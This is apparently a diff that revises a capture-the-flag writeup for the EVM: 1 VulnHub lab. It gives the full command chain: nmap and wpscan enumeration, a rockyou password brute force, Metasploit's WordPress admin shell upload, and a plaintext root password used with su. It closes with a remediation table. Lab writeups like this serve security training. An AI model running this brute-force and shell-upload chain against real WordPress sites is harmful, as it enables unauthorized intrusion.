@@ -1,105 +1,108 @@
 # EVM: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.103 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.103 |
 | **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | /root/proof.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/evm-1,391/) |
+| **Goal** | root flag (`/root/proof.txt`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/evm-1-vulnhub-walkthrough/) |
+
+---
 
 ## Attack Summary
 
-nmap → dirb `/wordpress/` → wpscan (user: `c0rrupt3d_brain`, pass: `24992499`) → MSF `wp_admin_shell_upload` → Meterpreter → `/home/root3r/.root_password_ssh.txt` → `su root` (`willy26`) → root
+EVM:1 runs a WordPress site accessible via an HTML comment in the default Apache page. A vulnerable plugin (`c0rrupt3d_brain`) is enumerated with WPScan. The admin password is brute-forced from rockyou.txt. Metasploit's authenticated WordPress shell-upload module provides a Meterpreter session. A root password stored in a plaintext file in the user's home directory enables full privilege escalation.
+
+---
 
 ## Methodology
 
-1. Network discovery
-2. Port scan and web enumeration
-3. WordPress user and password enumeration (wpscan)
-4. Metasploit WP admin shell upload
-5. Credential discovery and `su` to root
+1. Port scan: SSH, DNS, HTTP, POP3, IMAP, SMB open
+2. Web source review exposes `/wordpress/` path
+3. WPScan plugin and user enumeration
+4. WordPress admin password brute force
+5. Metasploit `wp_admin_shell_upload` for RCE
+6. Plaintext root password discovered in `/home/root3r/.root_password_ssh.txt`
+7. `su root` with recovered password
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Host Discovery and Port Scanning
 
 ```bash
 netdiscover
-```
-
-Target: 192.168.1.103
-
----
-
-## Step 2: Port Scan
-
-```bash
 nmap -A 192.168.1.103
 ```
 
-Open ports: 22 (SSH), 53 (DNS), 80 (HTTP), 110 (POP3), 139/445 (SMB), 143 (IMAP).
+Open ports: **22** (SSH), **53** (DNS), **80** (HTTP), **110** (POP3), **139** (NetBIOS), **143** (IMAP), **445** (SMB).
 
-![Nmap scan](images/01-nmap.png)
+![Nmap scan results](images/01-nmap.png)
 
 ---
 
-## Step 3: Web Enumeration
+## Step 2: Web Enumeration
+
+Browse to `http://192.168.1.103`. The default Apache page contains an HTML comment pointing to `/wordpress/`. Confirm with dirb:
 
 ```bash
 dirb http://192.168.1.103/
 ```
 
-Finds `/wordpress/`. Page source contains a comment pointing to the WordPress install.
-
-![WordPress discovery](images/02-wordpress.png)
+![Dirb results showing /wordpress/](images/02-dirb-enum.png)
 
 ---
 
-## Step 4: WordPress Enumeration with wpscan
+## Step 3: WordPress Enumeration with WPScan
 
 ```bash
 wpscan --url http://192.168.1.103/wordpress/ -e at -e ap -e u
 ```
 
-Identifies user `c0rrupt3d_brain` and the installed plugin `c0rrupt3d_brain`.
+Findings:
+- Vulnerable plugin: **c0rrupt3d_brain**
+- Username: **c0rrupt3d_brain**
 
-Brute-force the password:
+![WPScan plugin and user enumeration](images/03-wpscan.png)
+
+---
+
+## Step 4: Password Brute Force
 
 ```bash
-wpscan --url http://192.168.1.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt
+wpscan --url http://192.168.1.103/wordpress -U c0rrupt3d_brain \
+  -P /usr/share/wordlists/rockyou.txt
 ```
 
-Credentials: `c0rrupt3d_brain` / `24992499`
+Recovered password: **24992499**
 
-![wpscan enumeration and brute-force](images/03-wpscan.png)
+> Note: on some WPScan versions use `--wordlist` instead of `-P`.
 
 ---
 
 ## Step 5: Exploitation via Metasploit
 
 ```bash
-msfconsole -q
+msfconsole
 use exploit/unix/webapp/wp_admin_shell_upload
 set RHOSTS 192.168.1.103
 set TARGETURI /wordpress
 set USERNAME c0rrupt3d_brain
 set PASSWORD 24992499
-exploit
+run
 ```
 
-Meterpreter session opens as `www-data`.
+A Meterpreter session opens.
 
-![Metasploit WP shell upload](images/04-metasploit.png)
+![Meterpreter session established](images/04-meterpreter.png)
 
 ---
 
-## Step 6: Credential Discovery
+## Step 6: Post-Exploitation — Credential Discovery
 
 ```bash
-# In Meterpreter
+# Inside Meterpreter shell
 shell
-python -c 'import pty;pty.spawn("/bin/bash")'
 cd /home
 ls
 cd root3r
@@ -107,36 +110,42 @@ ls -la
 cat .root_password_ssh.txt
 ```
 
-Root password found: `willy26`
+The file contains the root password: **willy26**
 
 ---
 
-## Step 7: Privilege Escalation
+## Step 7: Privilege Escalation to Root
 
 ```bash
+# Spawn a proper TTY
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Switch to root
 su root
-# password: willy26
-whoami
-cd /root
-cat proof.txt
+# Password: willy26
+
+cat /root/proof.txt
 ```
 
-![Root flag](images/05-root.png)
+![Root flag captured](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **WordPress user enumeration** via wpscan trivially identifies valid usernames — enable login attempt limits
-2. **Weak WP passwords** in rockyou means they're among the first cracked — enforce strong passwords
-3. **`wp_admin_shell_upload`** is a reliable vector whenever WP admin credentials are known — disable XML-RPC and restrict the admin panel by IP
-4. **Plaintext credentials in home directories** (`.root_password_ssh.txt`) are an inexcusable privilege escalation path — never store passwords in files
+- HTML source comments in default server pages can expose application paths that would otherwise require active directory brute forcing.
+- WPScan is indispensable for WordPress targets: it surfaces vulnerable plugins that open paths for brute force and authenticated exploitation.
+- Storing credentials in plaintext files on the filesystem negates any access controls elsewhere in the stack.
+- The Metasploit `wp_admin_shell_upload` module remains reliable whenever authenticated WordPress admin access is available.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| WordPress user enumeration | Disable the author enumeration endpoint (`?author=1`) |
-| Weak password | Enforce strong password policy; enable 2FA |
-| WP admin shell upload | Restrict `/wp-admin/` by IP; use CSP and file upload controls |
-| Plaintext credentials in file | Remove credential files; use a secrets manager |
+|---|---|
+| WordPress path leaked in HTML comment | Remove developer comments before deploying to production |
+| Vulnerable WordPress plugin | Remove or update `c0rrupt3d_brain`; audit all installed plugins |
+| Weak admin password crackable with rockyou.txt | Enforce strong, unique passwords; add brute-force rate limiting |
+| Authenticated file upload leading to RCE | Harden WordPress file permissions; disable theme/plugin editing in `wp-config.php` |
+| Root password stored in plaintext file | Never store credentials in plaintext on disk; use a secrets manager |
